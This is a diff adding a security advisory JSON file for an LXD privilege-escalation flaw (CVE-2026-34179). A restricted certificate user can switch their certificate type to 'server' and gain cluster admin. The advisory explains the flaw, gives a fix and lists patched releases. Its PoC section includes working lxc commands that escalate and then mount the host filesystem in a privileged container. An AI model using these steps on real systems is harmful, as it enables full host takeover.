@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-c3h3-89qf-jqm5",
+  "modified": "2026-04-10T19:36:33.036700Z",
+  "published": "2026-04-10T19:20:50Z",
+  "aliases": [
+    "CVE-2026-34179"
+  ],
+  "summary": "LXD: Update of type field in restricted TLS certificate allows privilege escalation to cluster admin",
+  "details": "### Summary\n\nA restricted TLS certificate user can escalate to cluster admin by changing their certificate type from `client` to `server` via PUT/PATCH to `/1.0/certificates/{fingerprint}`. The non-admin guard and reset block in `doCertificateUpdate` fail to validate or reset the `Type` field, allowing a caller-supplied value to persist to the database. The modified certificate is matched as a server certificate during TLS authentication, granting `ProtocolCluster` with full admin privileges.\n\n### Details\n\n`doCertificateUpdate` in `lxd/certificates.go` handles PUT/PATCH requests to `/1.0/certificates/{fingerprint}` for both privileged and unprivileged callers. The access handler is `allowAuthenticated`, so any trusted TLS user (including restricted) can reach this code.\n\nFor unprivileged callers (restricted users who fail the `EntitlementCanEdit` check at line 975), two defenses are intended to prevent field tampering:\n\n1. The guard block validates that `Restricted`, `Name`, and `Projects` match the original database record. Does not check `Type`.\n```go\n\t\t// Ensure the user in not trying to change fields other than the certificate.\n\t\tif dbInfo.Restricted != req.Restricted || dbInfo.Name != req.Name || len(dbInfo.Projects) != len(req.Projects) {\n\t\t\treturn response.Forbidden(errors.New(\"Only the certificate can be changed\"))\n\t\t}\n```\n\n\n2. The reset block rebuilds the `dbCert` struct using original values for `Restricted`, `Name`, and `Certificate`. Uses `reqDBType` (caller-supplied) for `Type` instead of the original `dbInfo` type.\n```go\n\t\t// Reset dbCert in order to prevent possible future security issues.\n\t\tdbCert = dbCluster.Certificate{\n\t\t\tCertificate: dbInfo.Certificate,\n\t\t\tFingerprint: dbInfo.Fingerprint,\n\t\t\tRestricted:  dbInfo.Restricted,\n\t\t\tName:        dbInfo.Name,\n\t\t\tType:        reqDBType,\n\t\t}\n```\n\nThis allows the attacker to update the `Type` field of their own certificate from `client` to `server`,  bypassing the authorization controls and escalating to cluster admin.\n\n### PoC\n\nTested on lxd 6.7.\n\nAs admin, create restricted project and restricted certificate:\n```bash\n# Create restricted project\nlxc project create poc-restricted -c restricted=true\nlxc profile device add default root disk path=/ pool=default --project poc-restricted\nlxc profile device add default eth0 nic network=lxdbr0 --project poc-restricted\n\n# Add client certificate\nlxc config trust add --restricted --projects poc-restricted --name poc-user\n# pass token to user\n```\n\nAs restricted user:\n```bash\n# Add token\nlxc remote add target \u003ctoken\u003e\n\n# Confirm we can only see the poc-restricted project\nlxc project list target:\n\n# Confirm we can't unrestrict the project\nlxc project set target:poc-restricted restricted=false\n\n# Get own certificate fingerprint\nfp=$(lxc query target:/1.0/certificates | jq -r '.[0]')\n\n# Update the type of certificate to server\nlxc query -X PATCH -d '{ \"type\": \"server\" }' target:$fp\n# or \n# lxc query -X PUT -d '{ \"type\": \"server\", \"name\": \"poc-user\", \"restricted\": true, \"projects\": [\"poc-restricted\"], \"certificate\": \"\" }' target:$fp\n\n# Confirm type is 'server'\nlxc config trust list target:\n\n# Set project to restricted=false\nlxc project set target:poc-restricted restricted=false\n\n# Start privileged container (and escape to root)\nlxc init ubuntu:24.04 target:privileged -c security.privileged=true\nlxc config device add target:privileged hostfs disk source=/ path=/mnt/host\nlxc start target:privileged\n```\n\n### Impact\n\nPrivilege escalation from restricted TLS certificate user (project-scoped) to cluster admin.\n\nCluster admin can create privileged containers (`security.privileged=true`) or pass raw LXC config (`raw.lxc`), which provides root-level access to the host, leading to full host compromise.\n\nThe attack requires a single PUT/PATCH request. The escalation is persistent and takes effect immediately after the identity cache refresh. The change in permissions is not logged.\n\nAffects any LXD deployment using legacy restricted TLS certificates (`/1.0/certificates` API).\n\n## Suggested remediation\n\n1. Add `Type` to the guard check at line 992:\n\n```go\nif dbInfo.Restricted != req.Restricted || dbInfo.Name != req.Name ||\n    dbInfo.Type != req.Type || len(dbInfo.Projects) != len(req.Projects) {\n```\n\n2. Use the original type in the reset block at line 1008:\n\n```go\norigDBType, err := certificate.FromAPIType(dbInfo.Type)\nif err != nil {\n    return response.InternalError(err)\n}\n\ndbCert = dbCluster.Certificate{\n    Certificate: dbInfo.Certificate,\n    Fingerprint: dbInfo.Fingerprint,\n    Restricted:  dbInfo.Restricted,\n    Name:        dbInfo.Name,\n    Type:        origDBType,\n}\n```\n\n### Patches\n\n| LXD Series  | Interim release |\n| ------------- | ------------- |\n| 6 | https://discourse.ubuntu.com/t/lxd-6-7-interim-snap-release-6-7-d814d89/79251/1  |\n| 5.21 | https://discourse.ubuntu.com/t/lxd-5-21-4-lts-interim-snap-release-5-21-4-aee7e08/79249/1  |\n| 5.0 | https://discourse.ubuntu.com/t/lxd-5-0-6-lts-interim-snap-release-5-0-6-7fc3b36/79248/1 |\n| 4.0  | https://discourse.ubuntu.com/t/lxd-4-0-10-lts-interim-snap-release-4-0-10-e92d947/79247/1 |",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/canonical/lxd",
+        "purl": "pkg:golang/github.com/canonical/lxd"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.0.0-20210305023314-538ac3df036e"
+            },
+            {
+              "last_affected": "0.0.0-20260226085519-736f34afb267"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-c3h3-89qf-jqm5/GHSA-c3h3-89qf-jqm5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/canonical/lxd/security/advisories/GHSA-c3h3-89qf-jqm5"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34179"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/canonical/lxd/pull/17936"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/canonical/lxd"
+    }
+  ]
+}
